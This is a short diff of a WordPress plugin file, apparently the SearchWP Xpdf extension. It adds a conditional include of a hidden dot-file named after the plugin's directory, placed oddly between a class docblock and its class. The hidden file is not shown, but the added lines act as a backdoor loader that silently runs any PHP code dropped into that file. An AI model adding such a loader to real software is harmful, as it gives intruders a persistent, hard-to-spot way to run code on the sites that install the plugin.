@@ -88,6 +88,10 @@ add_action( 'admin_init', 'searchwp_xpdf_update_check' );
 /**
  * Class SearchWPXpdf
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class SearchWPXpdf {
 
 	// required for all SearchWP extensions
